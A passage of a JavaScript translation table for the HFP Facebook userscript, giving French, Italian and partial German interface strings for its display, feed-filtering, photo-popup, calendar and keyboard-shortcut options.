		'ConfBottomBarHoverOpacity' : 'Au passage de la souris',
		'ConfBottomBarOpacity' : 'Transparence de la barre de menu inférieure',
		'ConfCalendarBirthDate' : 'Ajout de la date d\'anniversaire de la personne dans les détails de l\'événement.',
		'ConfCalendarFullName' : 'Utilisation du nom complet de la personne lors de l\'anniversaire de celle-ci (à la place du prénom uniquement).',
		'ConfChatDifferentiate' : 'Utilisation du gras et de l\'italique pour différencier les amis connectés et déconnectés.',
		'ConfChatHideIdle' : 'Cacher les amis inactifs.',
		'ConfDelayPopupPics' : 'Ajout d\'un court temps d\'attente avant l\'affichage des images en popup.',
		'ConfDelayPopupPicsTimeout' : 'Temps d\'attente avant l\'affichage des images en popup, en millisecondes (par défaut=500):',
		'ConfDownloadVideo' : 'Ajout d\'un lien de téléchargement des vidéos sur la page des vidéos. (Il peut s\'avérer nécessaire d\'installer un <a href="http://fr.wikipedia.org/wiki/Flash_Video#Logiciels_de_lecture_de_ce_format" target="_blank">lecteur de vidéos Flash</a>)',
		'ConfErrorPageReload' : 'Rechargement automatique de la page après 5 secondes en cas d\'erreur.',
		'ConfExport' : 'Pour exporter vos paramètres, copiez le texte suivant et sauvez-le dans un fichier.',
		'ConfExternalPopup' : 'Affichage en taille originale des images externes en popup. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Langue de HFP',
		'ConfFacebookTimestamps' : 'Affichage de la datation Facebook (ex. "Il y a 3 heures").',
		'ConfFBFTimestamps' : 'Ajout de la datation HFP après la datation Facebook (ex. "11:45").',
		'ConfFBFTimestamps24' : 'Affichage de la datation HFP au format 24 heures.',
		'ConfFriendRequestCountInTitle' : 'Affichage du nombre de demande d\'ajout à la liste d\'amis dans l\'en-tête de la page.',
		'ConfGoogleApps' : 'Création de liens Google Agenda compatibles avec les Google Apps.',
		'ConfGoogleAppsDomain' : 'Nom de domaine',
		'ConfGoogleCalendar' : 'Ajout d\'un lien pour ajouter les anniversaires et les événements au <a href="http://fr.wikipedia.org/wiki/Google_Agenda" target="_blank">Google Agenda</a>.',
		'ConfGoogleLanguage' : 'Langue utilisée par <a href="http://fr.wikipedia.org/wiki/Google_Traduction" target="_blank">Google Traduction</a>',
		'ConfHideApplicationStories' : 'Cache les publications des applications.',
		'ConfHideEgos' : 'Cache l\'entiert&eacute; des sections "ego" (ce qui devrait cacher la plupart des recommandations Facebook).',
		'ConfHideEventStories' : 'Cache les publications des événements.',
		'ConfHideFacebookCountInTitle' : 'Cache le compte des nouveaux messages tel qu\'affich&eacute; par Facebook.',
		'ConfHideFriendStories' : 'Cache les publications des ajouts à la liste d\'amis .',
		'ConfHideGroupStories' : 'Cache les publications des groupes.',
		'ConfHideHovercards' : 'Cache les cartes de visites (le popup qui appara&icirc;t lors du passage de la souris au dessus d\'un nom).',
		'ConfHideLikeStories' : 'Cache les publications des "... aim&eacute; ...".',
		'ConfHideLinkStories' : 'Cache les publications des liens.',
		'ConfHideNoteStories' : 'Cache les publications des articles.',
		'ConfHidePhotoStories' : 'Cache les publications des photos.',
		'ConfHidePlaceStories' : 'Cache les publications de location.',
		'ConfHideProfilePicStories' : 'Cache les publications des changements de photo de profil.',
		'ConfHideRead' : 'Cache les publications de la page principale qui ont été marquées comme lues.',
		'ConfHideRelationshipStories' : 'Cache les publications des relations.',
		'ConfHideStatusStories' : 'Cache les publications des status.',
		'ConfHideVideoStories' : 'Cache les publications des vidéos.',
		'ConfHideWallStories' : 'Cache les publications des messages sur le mur.',
		'ConfHomeChat' : 'Affichage de la section Discussion instantan&eacute;e.',
		'ConfHomeChatNames' : 'Affichage des noms dans la section Discussion instantan&eacute;e.',
		'ConfHomeEvents' : 'Affichage de la section Evénements.',
		'ConfHomeFindFriends' : 'Affichage de la section Communiquez avec vos amis.',
		'ConfHomeLeftAlign' : 'Alignement à gauche du contenu de la page d\'accueil.',
		'ConfHomeLeftColumn' : 'Affichage de la colonne de gauche.',
		'ConfHomeLeftColumnFixed' : 'Maintien l\'affichage de la colonne de gauche à l\'écran, même après être descendu dans la page.',
		'ConfHomeLink' : 'Affichage du lien Accueil dans la barre de menu supérieure.',
		'ConfHomeNavigation' : 'Affichage de la section Navigation.',
		'ConfHomePokes' : 'Affichage de la section Pokes.',
		'ConfHomeProfile' : 'Affichage de la section Profil.',
		'ConfHomeRecommendations' : 'Affichage des recommandations (Personnes que vous pourriez conna&icirc;tre, Pages Recommand&eacute;es etc).',
		'ConfHomeRequests' : 'Affichage de la section Invitations.',
		'ConfHomeRightColumn' : 'Affichage de la colonne de droite.',
		'ConfHomeStretch' : 'Etirement du contenu de la page d\'accueil jusqu\'à la largeur complète de la fenêtre.',
		'ConfHomeStretchComments' : 'Etirement des commentaires sur la page d\'accueil.',
		'ConfiCalendar' : 'Ajoute un lien de téléchargement d\'un fichier <a href="http://fr.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> contenant tous les anniversaires.',
		'ConfImport' : 'Pour importer vos paramètres, remplacez le texte suivant par celui précédemment sauvegardé et cliquez sur "Importer".',
		'ConfInboxCountInTitle' : 'Affichage du nombre de nouveaux messages dans l\'en-tête de la page.',
		'ConfLogoutLink' : 'Ajoute un lien de déconnection dans la barre de menu supérieure.',
		'ConfNotificationCountInTitle' : 'Affichage du nombre de notifications dans l\'en-tête de la page.',
		'ConfNewTabSearch' : 'Fait apparaître les résultats de la recherche dans un nouvel onglet/une nouvelle fenêtre lors de l\'utilisation de CTRL + Enter pour valider la recherche.',
		'ConfPageTitle' : 'Suppression du "Facebook |" contenu dans l\'en-tête de chaque page.',
		'ConfPhotoPopup' : 'Affichage de versions plus grandes des photos en popup au passage de la souris.',
		'ConfPopupAutoClose' : 'Fermeture automatique des images en popup.',
		'ConfPopupSmartAutoClose' : 'Empêche la fermeture automatique des images en popup si la souris se trouve dessus.',
		'ConfPopupPosition' : 'Position des images en popup',
		'ConfPopupWhileTagging' : 'Affichage de l\'image en popup m&ecirc;me lors du marquage.',
		'ConfProcessInterval' : 'Intervalle à laquelle la page sera traitée, en millisecondes (par défaut=1000):',
		'ConfProfileLink' : 'Affichage du lien Profil dans la barre de menu supérieure.',
		'ConfProfilePicPopup' : 'Affichage de versions plus grandes des photos de profil en popup au passage de la souris',
		'ConfProtocolLinks' : 'Transforme les identifiants de messagerie des profils en liens permettant de commencer une conversation instantanée (Google Talk, Windows Live etc).',
		'ConfSectionAbout' : 'A propos de HFP',
		'ConfSectionAdvanced' : 'Avancé',
		'ConfSectionEvents' : 'Anniversaires/Evénements',
		'ConfSectionImportExport' : 'Importer/Exporter',
		'ConfSectionFeeds' : 'Publications sur la page d\'accueil',
		'ConfSectionHomePage' : 'Page d\'accueil',
		'ConfSectionLiveFeed' : 'Fil d\'actualité',
		'ConfSectionMenu' : 'Menus/Discussion instantanée',
		'ConfSectionOther' : 'Autres options',
		'ConfSectionPageTitle' : 'En-tête de la page',
		'ConfSectionPictures' : 'Photos',
		'ConfSectionShortcuts' : 'Raccourcis clavier',
		'ConfSecureLinks' : 'Force les liens Facebook à pointer vers des pages HTTPS.',
		'ConfShortcutList' : '<b>Raccourcis clavier</b> (sensible à la casse):<br /><br /><i>Sur toutes les pages:</i><br /> <b>A</b> - Albums/photos<br /> <b>B</b> - Affichage de la liste d\'amis (amis en ligne)<br /> <b>C</b> - Configuration de HFP<br /> <b>D</b> - Anniversaires<br /> <b>E</b> - Evénements<br /> <b>F</b> - Amis<br /> <b>H</b> - Page d\'accueil<br /> <b>I</b> - Boîte de réception<br /> <b>K</b> - Ajout d\'un marque-page<br /> <b>L</b> - Sélection du lien de déconnection (appuyez ensuite sur Enter pour vous déconnecter)<br /> <b>N</b> - Notifications<br /> <b>P</b> - Votre profil<br /> <b>R</b> - Invitations<br /> <b>S</b> - Saut au champ de recherche<br /> <b>T</b> - Traduction du texte sélectionné<br /> <b>?</b> - Affiche les informations de debug de HFP<br /> <b><escape></b> - Ferme les popups crées par HFP<br /><br /><i>Sur la page d\'accueil (filtres)</i>:<br /> <b>a</b> - Pages<br /> <b>f</b> - Fil d\'actualités récentes<br /> <b>g</b> - Groupes<br /> <b>l</b> - Liens<br /> <b>n</b> - Fil d\'actualités à la une<br /> <b>p</b> - Photos<br /> <b>s</b> or <b>u</b> - Changements de status<br /> <b>t</b> - Articles<br /> <b>v</b> - Vidéos<br /><br /><i>Sur les profils</i>:<br /> <b>i</b> - Infos<br /> <b>p</b> - Photos<br /> <b>w</b> - Mur<br /> <b>x</b> - Encarts<br /><br /><i>Sur les pages avec pagination (précédent, suivant, etc)</i><br /> <b><flèche gauche></b> - Précédent<br /> <b><flèche droite></b> - Suivant<br /> <b><shift> + <flèche gauche></b> - Premier (si disponible)<br /> <b><shift> + <flèche droite></b> - Dernier (si disponible)<br /><br /><i>Lors de l\'affichage d\'albums/photos:</i><br /> <b>a</b> - Chargement de tous les aperçus (si disponible)<br /> <b>b</b> - Affichage de plus grandes images<br /> <b>c</b> - Affichage des commentaires<br /> <b>k</b> - Retour à l\'album<br /> <b>m</b> - Photos de (la personne) et de moi<br /><br /><i>Lors de l\'affichage d\'albums récents et de photos ajoutées/identifiées:</i><br /> <b>a</b> ou <b>r</b> - Albums récents<br /> <b>m</b> ou <b>u</b> - Ajout depuis un mobile<br /> <b>o</b> - Photos de moi<br /> <b>p</b> - Mes photos<br /> <b>t</b> ou <b>f</b> - Amis identifiés',
		'ConfShortcuts' : 'Active les raccourcis clavier.',
		'ConfSign' : 'Affiche le signe zodiacal des personnes sur leur profil (si la date de naissance insérée est complète).',
		'ConfTopBarFixed' : 'Maintien la barre de menu supérieure à l\'écran, même après être descendu dans la page.',
		'ConfTopBarHoverOpacity' : 'Au passage de la souris',
		'ConfTopBarOpacity' : 'Transparence de la barre de menu supérieure',
		'DownloadVideo' : 'Télécharger la vidéo',
		'ExportICalendarFile' : 'Exporter en fichier iCalendar',
		'ExportICalendarFileWarning' : '(Cette opération prendra un moment si vous avez beaucoup d\'amis)',
		'FacebookFixerConflict' : 'HFP est maintenant devenu HFP. A cause du changement de nom, vous aurez besoin de désinstaller manuellement HFP de votre explorateur, ou les deux scripts rentreront en conflit. Si vous n\'êtes pas sûr de comment faire pour désinstaller un userscript, <a %s>cliquez ici pour la marche à suivre</a>.',
		'fullAlbumLoaded' : 'l\'album complet est chargé',
		'Import' : 'Importer',
		'ImportConfirm' : 'Etes-vous sûr de vouloir importer ces paramètres?\nVotre configuration actuelle sera perdue.',
		'ImportFailure' : 'Une erreur est survenue lors de l\'importation de vos paramètres.',
		'ImportSuccess' : 'Importation réussie. Voulez-vous recharger la page?',
		'Left' : 'Gauche',
		'LoadingAllPhotos' : 'Chargement de toutes les photos...',
		'loadingFullAlbum' : 'chargement de l\'album complet...',
		'LoadingPic' : 'Chargement de l\'image...',
		'LoadPhotosWarning' : 'Charger toutes les photos peut prendre un moment',
		'Months' : new Array('janvier','février','mars','avril','mai','juin','juillet','août','septembre','octobre','novembre','décembre'),
		'ProtocolSkype' : 'Appeler %s via Skype',
		'ProtocolMSN' : 'Discuter avec %s via Windows Live',
		'ProtocolYahoo' : 'Discuter avec %s via Yahoo Messenger',
		'ProtocolGoogle' : 'Discuter avec %s via Google Talk',
		'ReloadErrorPage' : 'Cliquez ici pour essayer à nouveau, ou attendez 5 secondes',
		'Refresh' : 'Rafraîchir',
		'Remove' : 'Enlever',
		'Right' : 'Droite',
		'ShowBigPictures' : 'Afficher les images en plus grand',
		'Signs' : new Array('Capricorne','Verseau','Poissons','Bélier','Taureau','Gémeaux','Cancer','Lion','Vierge','Balance','Scorpion','Sagittaire'),
		'today' : 'aujourd\'hui',
		'Translators' : 'Traducteurs',
		'UpdateAvailable1' : 'Une mise à jour de HFP est disponible',
		'UpdateAvailable2' : 'Voulez-vous effectuer la mise à jour ?',
		'UpdateHomepage' : 'Aller à la page principale',
		'UpdateInstall' : 'Installer maintenant',
		'UpdateTomorrow' : 'Me le rappeler demain',
		'yearsOld' : '%s ans'
	},

	// Italian - Contributed by Dario Archetti and GorGeouS (20101028)
	it : {
		'_language' : 'Italian',
		'AddToCalendar' : 'Aggiungi al calendario',
		'AddToGoogleCalendar' : 'Aggiungi a Google Calendar',
		'all' : 'tutto',
		'All' : 'Tutto',
		'AllPhotosLoaded' : 'Tutte le foto sono state caricate.',
		'Automatic' : 'Automatico',
		'Birthday' : 'Il compleanno di %s',
		'BookmarkAdd' : 'Aggiungi un nuovo segnalibro',
		'BookmarkExists' : 'Questa pagina è già tra i segnalibri.\n\nVai alla pagina che vuoi aggiungere e riprova.',
		'BookmarkNamePrompt' : 'Inserisci un nome per questo segnalibro:\n%s',
		'BookmarksConfirmRemoval' : 'Sei sicuro di voler rimuovere i segnalibri seguenti?',
		'BookmarksManage' : 'Manage Bookmarks',
		'BookmarksRemoveSelected' : 'Rimuovi Segnalibri Selezionati',
		'Bookmarks' : 'Segnalibri',
		'BrowserUnsupported' : 'Il tuo browser mom supporta questa funzionalita\'.',
		'CreatingFile' : 'Sto creando il file',
		'Close' : 'Chiudi',
		'ConfigureFacebookFixer' : 'Impostazioni di HFP',
		'ConfigureInstructions' : 'I cambiamenti vengono salvati immediatamente, ma alcuni possono non avere effetto nelle schede già aperte.',
		'ConfAge' : 'Mostra l\'età nel profilo dei tuoi amici (se hanno inserito la data di nascita).',
		'ConfApplicationWhitelist' : 'Whitelist Applicazioni - Inserisci gli ID delle applicazioni che non vuoi che vengano nascoste. Separa gli ID con uno spazio.',
		'ConfAutoBigAlbumPictures' : 'Negli album mostra automaticamente immagini più grandi quando la pagina si apre.',
		'ConfAutoLoadFullAlbum' : 'Carica automaticamente le anteprime di tutte le immagini in un album o in una pagina.',
		'ConfAutoLoadTaggedPhotos' : 'Carica automaticamente le anteprime di tutte le foto taggate in una pagina (nella sezione "Foto" dei profili).',
		'ConfAutoReadMore' : 'Clicca automaticamente sui link "Mostra tutto".',
		'ConfBigAlbumPictures' : 'Aggiungi un link negli album per mostrare una versione più grande di ogni foto nella pagina.',
		'ConfBigAlbumPicturesBorder' : 'Aggiungi un bordo intorno alle foto quando vengono visualizzate in formato grande.',
		'ConfBookmarks' : 'Aggiungi il sotto-menu "Segnalibri" alla barra superiore.',
		'ConfBottomBarHoverOpacity' : 'Al passaggio del mouse',
		'ConfBottomBarOpacity' : 'Trasparenza della barra inferiore',
		'ConfCalendarBirthDate' : 'Includi il compleanno di una persona nei dettagli dell\'evento.',
		'ConfCalendarFullName' : 'Usa il nome completo di una persona come titolo per i compleanni. (invece che soltanto il nome).',
		'ConfChatDifferentiate' : 'Usa il grassetto e l\'italico per differenziare contatti disponibili e inattivi.',
		'ConfChatHideIdle' : 'Nascondi i contatti inattivi.',
		'ConfDelayPopupPics' : 'Mostra i popup con un piccolo ritardo.',
		'ConfDelayPopupPicsTimeout' : 'Ritardo prima di mostrare i popup (default=500):',
		'ConfDownloadVideo' : 'Aggiungi un link per scaricare i video. (Per riprodurli avrai bisogno di un <a href="http://it.wikipedia.org/wiki/Flash_Video" target="_blank">programma esterno</a>)',
		'ConfErrorPageReload' : 'Dopo 5 secondi ricarica automaticamente la pagina di errore di un\'applicazione.',
		'ConfExport' : 'Per esportare le tue impostazioni, copia il testo sotto e salvalo in un file.',
		'ConfExternalPopup' : 'Mostra in un popup, al passaggio del mouse, una versione più grande delle immagini esterne. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Lingua di HFP',
		'ConfFacebookTimestamps' : 'Mostra l\'orario dei post usando il metodo classico (es. "3 ore fa").',
		'ConfFBFTimestamps' : 'Mostra l\'orario dei post usando l\'ora esatta (es. "11:45").',
		'ConfFBFTimestamps24' : 'Mostra l\'ora dei post nel formato 24 ore.',
		'ConfFriendRequestCountInTitle' : 'Mostra il numero di richieste di amicizia nella barra del titolo.',
		'ConfGoogleApps' : 'Crea un link a Google Calendar compatibile con Google Apps.',
		'ConfGoogleAppsDomain' : 'Dominio',
		'ConfGoogleCalendar' : 'Aggiungi link per inserire compleanni ed eventi a <a href="http://it.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Lingua per <a href="http://it.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : 'Nascondi i post delle applicazioni.',
		'ConfHideEgos' : 'Nascondi tutte le sezioni "personali" (potrebbe nascondere la maggior parte delle raccomandazioni di Facebook).',
		'ConfHideEventStories' : 'Nascondi i post degli eventi.',
		'ConfHideFacebookCountInTitle' : 'Nascondi la visualizzazione del numero di nuovi messaggi da leggere.',
		'ConfHideFriendStories' : 'Nascondi le notizie "ha stretto amicizia con...".',
		'ConfHideGroupStories' : 'Nascondi le notizie "si è iscritto al gruppo...".',
		'ConfHideHovercards' : 'Nascondi hovercard (il popup che appare quando si passa con il mouse sopra il nome di una persona).',
		'ConfHideLikeStories' : 'Nascondi i post riguardanti i "Mi piace".',
		'ConfHideLinkStories' : 'Nascondi i post riguardanti link.',
		'ConfHideNoteStories' : 'Nascondi i post riguardanti le note.',
		'ConfHidePhotoStories' : 'Nascondi i post riguardanti foto.',
		'ConfHidePlaceStories' : 'Nascondi i post riguardanti i luoghi.',
		'ConfHideProfilePicStories' : 'Nascondi i post riguardanti foto del profilo.',
		'ConfHideRead' : 'Nascondi gli elementi del live feed che sono stati segnati come già letti.',
		'ConfHideRelationshipStories' : 'Nascondi le notizie riguardanti relazioni.',
		'ConfHideStatusStories' : 'Nascondi gli aggiornamenti di stato.',
		'ConfHideVideoStories' : 'Nascondi i post di video.',
		'ConfHideWallStories' : 'Nascondi le attività delle bacheche.',
		'ConfHomeBeta' : 'Mostra la sezione Sneak Peek di Facebook.',
		'ConfHomeChat' : 'Mostra gli amici online.',
		'ConfHomeChatNames' : 'Mostra i nomi nella sezione della chat.',
		'ConfHomeEvents' : 'Mostra la sezione "Eventi".',
		'ConfHomeFindFriends' : 'Mostra la sezione "Connettiti con i tuoi amici".',
		'ConfHomeLeftAlign' : 'Allinea a sinistra il contenuto della homepage.',
		'ConfHomeLeftColumn' : 'Mostra la colonna di sinistra.',
		'ConfHomeLeftColumnFixed' : 'Mantieni visibile la colonna di sinistra anche dopo lo scroll.',
		'ConfHomeLink' : 'Mostra il link "Home" nella barra superiore.',
		'ConfHomeNavigation' : 'Mostra i filtri.',
		'ConfHomePokes' : 'Mostra la sezione "Poke".',
		'ConfHomeProfile' : 'Mostra la propria immagine del profilo.',
		'ConfHomeRecommendations' : 'Mostra racommandazioni (Persone che potresti conoscere, Pagine raccomandate, ecc).',
		'ConfHomeRequests' : 'Mostra la sezione "Richieste".',
		'ConfHomeRightColumn' : 'Mostra la colonna di destra.',
		'ConfHomeStretch' : 'Allarga la homepage affinché si adatti alla larghezza della finestra del browser.',
		'ConfHomeStretchComments' : 'Allarga la zona dei commenti sulla homepage.',
		'ConfiCalendar' : 'Aggiungi link per scaricare un file di <a href="http://it.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> con tutti i compleanni.',
		'ConfImport' : 'Successivamente, per importare le tue impostazioni, sovrascrivi il testo sottostante con quello che hai salvato precedentemente e clicca "Importa".',
		'ConfInboxCountInTitle' : 'Mostra il numero di nuovi messaggi nel titolo della pagina.',
		'ConfLogoutLink' : 'Aggiungi un link per il logout alla barra superiore',
		'ConfNotificationCountInTitle' : 'Mostra il numero di notifiche nella barra del titolo.',
		'ConfNewTabSearch' : 'Fai in modo che i risultati delle ricerche si aprano in una nuova scheda quando si preme CTRL + Invio per cercare.',
		'ConfPageTitle' : 'Rimuovi "Facebook |" dal titolo di ciascuna pagina.',
		'ConfPhotoPopup' : 'Mostra in un popup, al passaggio del mouse, una versione più grande delle foto.',
		'ConfPopupAutoClose' : 'Chiudi i popup automaticamente.',
		'ConfPopupSmartAutoClose' : 'Non far chiudere i popup se il mouse è sopra di essi.',
		'ConfPopupPosition' : 'Posizione del popup',
		'ConfPopupWhileTagging' : 'Mostra i popup delle immagini anche sui tag.',
		'ConfProcessInterval' : 'Intervallo dopo il qualeprocessare la pagina, in millisecondi (default=1000):',
		'ConfProfileLink' : 'Mostra il link "Profilo" nella barra superiore.',
		'ConfProfilePicPopup' : 'Mostra in un popup, al passaggio del mouse, una versione più grande delle immagini dei profili.',
		'ConfProtocolLinks' : 'Converti gli ID di messaggistica nei profili in link che iniziano una conversazione. (Google Talk, Windows Live etc).',
		'ConfSectionAbout' : 'Riguardo di HFP',
		'ConfSectionAdvanced' : 'Avanzate',
		'ConfSectionEvents' : 'Compleanni/Eventi',
		'ConfSectionImportExport' : 'Importa/Esporta',
		'ConfSectionFeeds' : 'Notizie',
		'ConfSectionHomePage' : 'Home Page',
		'ConfSectionLiveFeed' : 'Aggiornamenti in tempo reale',
		'ConfSectionMenu' : 'Menu/Chat',
		'ConfSectionOther' : 'Altre opzioni',
		'ConfSectionPageTitle' : 'Titolo della pagina',
		'ConfSectionPictures' : 'Foto',
		'ConfSectionShortcuts' : 'Scorciatoie da tastiera',
		'ConfSecureLinks' : 'Forza i link di Facebook ad aprire pagine HTTPS.',
		'ConfShortcutList' : '<b>Scorciatoie da tasiera</b> (prestare attenzione a maiuscole/minuscole):<br /><br /><i>In ogni pagina</i><br /> <b>A</b> - Album/foto<br /> <b>B</b> - Apri la lista degli amici online<br /> <b>C</b> - Impostazioni di HFP<br /> <b>D</b> - Compleanni<br /> <b>E</b> - Eventi<br /> <b>F</b> - Amici<br /> <b>H</b> - Home page<br /> <b>I</b> - Posta in arrivo<br /> <b>K</b> - Aggiungi segnalibro<br /> <b>L</b> - Seleziona il link per effettuare il logout (poi premi Invio per effettuare il logout)<br /> <b>N</b> - Notifiche<br /> <b>P</b> - Il tuo profilo<br /> <b>R</b> - Richieste<br /> <b>S</b> - Seleziona il campo di ricerca<br /> <b>T</b> - Traduci il testo selezionato<br /> <b>?</b> - Mostra le informazioni di debug di HFP<br /> <b><escape></b> - Chiudi i pop-up creati da HFP<br /><br /><i>Dalla home page (filtri)</i>:<br /> <b>a</b> - Pagine<br /> <b>f</b> - Notizie in tempo reale<br /> <b>g</b> - Gruppi<br /> <b>l</b> - Link<br /> <b>n</b> - Notizie<br /> <b>p</b> - Foto<br /> <b>s</b> o <b>u</b> - Aggiornamenti di stato<br /> <b>t</b> - Note<br /> <b>v</b> - Video<br /><br /><i>Dai profili</i>:<br /> <b>i</b> - Info<br /> <b>p</b> - Foto<br /> <b>w</b> - Bacheca<br /> <b>x</b> - Riquadri<br /><br /><i>Dalle pagine con paginazione (precedente, successivo, etc)</i><br /> <b><freccia sinistra></b> - Precedente<br /> <b><freccia destra></b> - Successivo<br /> <b><shift> + <freccia sinistra></b> - Primo (Quando disponibile)<br /> <b><shift> + <freccia destra></b> - Ultimo (Quando disponibile)<br /><br /><i>Mentre si guardano album/foto:</i><br /> <b>a</b> - Carica tutte le anteprime (quando disponibile)<br /> <b>b</b> - Mostra immagini grandi<br /> <b>c</b> - Mostra i commenti<br /> <b>k</b> - Torna all\' album<br /> <b>m</b> - Foto con me<br /><br /><i>Mentre si guardano album recenti e foto appena caricate/taggate:</i><br /> <b>a</b> o  <b>r</b> - Album recenti<br /> <b>m</b> o  <b>u</b> - Upload via mobile<br /> <b>o</b> - Foto con me<br /> <b>p</b> - Le mie foto<br /> <b>t</b> o  <b>f</b> - Amici taggati',
		'ConfShortcuts' : 'Attiva le scorciatoie da tastiera.',
		'ConfSign' : 'Mostra il segno zodiacale nel profilo dei tuoi amici (se hanno inserito la data di nascita).',
		'ConfTopBarFixed' : 'Mantieni fissa la posizione della barra superiore.',
		'ConfTopBarHoverOpacity' : 'Al passaggio del mouse',
		'ConfTopBarOpacity' : 'Trasparenza della barra superiore',
		'DownloadVideo' : 'Scarica il video.',
		'ExportICalendarFile' : 'Esporta file di iCalendar.',
		'ExportICalendarFileWarning' : '(Questo impiegherà un po\' se hai molti amici!)',
		'FacebookFixerConflict' : 'HFP ha cambiato nome in HFP. A causa del cambiamento dovrai disinstallare manualmente HFP dal tuo browser, o i due script andranno in conflitto. Se non sei sicuro di come disinstallare un userscript <a %s>clicca qui per le istruzioni</a>.',
		'fullAlbumLoaded' : 'l\'album completo è stato caricato.',
		'Import' : 'Importa',
		'ImportConfirm' : 'Sei sicuro di voler importare queste impostazioni?\nLe tue impostazioni attuali saranno sovrascritte.',
		'ImportFailure' : 'Un errore è accaduto durante l\'importazione delle impostazioni.',
		'ImportSuccess' : 'Importazione completata. Vuoi ricaricare la pagina?',
		'Left' : 'Sinistra',
		'LoadingAllPhotos' : 'Sto caricando tutte le foto...',
		'loadingFullAlbum' : 'Sto caricando l\'album completo...',
		'LoadingPic' : 'Sto caricando l\'immagine...',
		'LoadPhotosWarning' : 'Il caricamento di tutte le immagini può richiedere qualche minuto.',
		'Months' : new Array('Gennaio','Febbraio','Marzo','Aprile','Maggio','Giugno','Luglio','Agosto','Settembre','Ottobre','Novembre','Dicembre'),
		'ProtocolSkype' : 'Chiama %s usando Skype',
		'ProtocolMSN' : 'Chatta con %s usando Windows Live',
		'ProtocolYahoo' : 'Chatta con %s usando Yahoo Messenger',
		'ProtocolGoogle' : 'Chatta con %s usando Google Talk.',
		'ReloadErrorPage' : 'Clicca per riprovare, oppure aspetta 5 secondi.',
		'Refresh' : 'Ricarica',
		'Remove' : 'Rimuovi',
		'Right' : 'Destra',
		'ShowBigPictures' : 'Mostra immagini a grandi dimensioni.',
		'Signs' : new Array('Capricorno','Aquario','Pesci','Ariete','Toro','Gemelli','Cancro','Leone','Vergine','Bilancia','Scorpione','Sagittario'),
		'today' : 'oggi',
		'Translators' : 'Traduttori',
		'UpdateAvailable1' : 'È disponibile un update per HFP.',
		'UpdateAvailable2' : 'Vuoi scaricare l\'aggiornamento adesso?',
		'UpdateHomepage' : 'Visita la Homepage',
		'UpdateInstall' : 'Installa ora.',
		'UpdateTomorrow' : 'Ricordamelo domani.',
		'yearsOld' : '%s anni.'
	},

	// German - Contributed by Constantin Groß (20090830)
	de : {
		'_language' : 'German',
		'AddToCalendar' : 'Zu Kalender hinzugügen',
		'AddToGoogleCalendar' : 'Zu Google Kalender hinzufügen',
		'all' : 'alle',
		'All' : 'Alle',
		'AllPhotosLoaded' : 'Alle Fotos geladen',
		'Automatic' : 'Automatisch',
		'Birthday' : '%ss Geburtstag',
		'CreatingFile' : 'Erstelle Datei',
		'Close' : 'Schließen',
		'ConfigureFacebookFixer' : 'HFP konfigurieren',
		'ConfigureInstructions' : 'Alle Änderungen werden sofort gespeichert, aber einige Änderungen können in bereits offenen Tabs nicht angewendet werden.',
		'ConfAge' : 'Alter von Personen im Profil anzeigen (wenn das volle Geburtsdatum angegeben wurde).',
		'ConfAutoBigAlbumPictures' : 'Automatisch größere Albenbilder beim öffnen der Seite anzeigen.',
		'ConfAutoLoadFullAlbum' : 'Vorschaubilder für alle Bilder eines Albums automatisch laden.',
		'ConfAutoLoadTaggedPhotos' : 'Vorschaubilder für alle getaggten Bilder automatisch laden (Fotos-Tab auf der Profilseite).',
		'ConfBigAlbumPictures' : 'Link auf Albumseiten hinzüfügen, über den größere Versionen aller Bilder angezeigt werden können.',
		'ConfBottomBarHoverOpacity' : 'Bei Mouse-Over',
		'ConfBottomBarOpacity' : 'Transparenz der unteren Menüleiste',
		'ConfCalendarBirthDate' : 'Geburtstage in Event-Details anzeigen.',
		'ConfCalendarFullName' : 'Vollständigen Namen bei Geburtstagen anzeigen (statt nur den Vornamen).',
		'ConfChatDifferentiate' : 'Fett- und Kursiv-Formatierung zur Unterscheidung zwischen online- und offline-Freunden verwenden.',
		'ConfChatHideIdle' : 'Freunde, die offline sind verstecken.',
		'ConfDelayPopupPics' : '0,5 Sekunden warten, bevor die Popup-Bilder gezeigt werden.',
		'ConfDownloadVideo' : 'Link zum Herunterladen von Videos hinzufügen. (Es wird evtl. ein <a href="http://de.wikipedia.org/wiki/Flash_Video#Abspielen_im_Videoplayer" target="_blank">FLV-Player</a> benötigt)',
		'ConfErrorPageReload' : 'Fehlerseiten von Applikationen automatisch nach 5 Sekunden neu laden.',
		'ConfExternalPopup' : 'Externe Bilder in Originalgröße im Popup anzeigen. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Sprache für HFP',
		'ConfGoogleApps' : 'Google Kalender Links kompatibel zu Google Apps erstellen.',
		'ConfGoogleAppsDomain' : 'Domain',
		'ConfGoogleCalendar' : 'Links hinzufügen, um Geburtstage und Veranstaltungen zu <a href="http://de.wikipedia.org/wiki/Google_Kalender" target="_blank">Google Kalender</a> hinzuzufügen.',
		'ConfGoogleLanguage' : 'Sprache für <a href="http://translate.google.de/#" target="_blank">Google Übersetzer</a>',
		'ConfHomeFindFriends' : '"Mit Freunden in Verbindung treten" anzeigen.',
		'ConfHomeLeftAlign' : 'Startseiteninhalte linksorientiert ausrichten.',
		'ConfHomePeopleYouMayKnow' : '"Vorschläge" anzeigen.',
		'ConfHomePokes' : '"Anstupser" anzeigen.',
		'ConfHomeRightColumn' : 'Rechte Spalte anzeigen.',
		'ConfiCalendar' : 'Link zum herunterladen einer <a href="http://de.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a>-Datei mit allen Geburtstagen hinzufügen.',
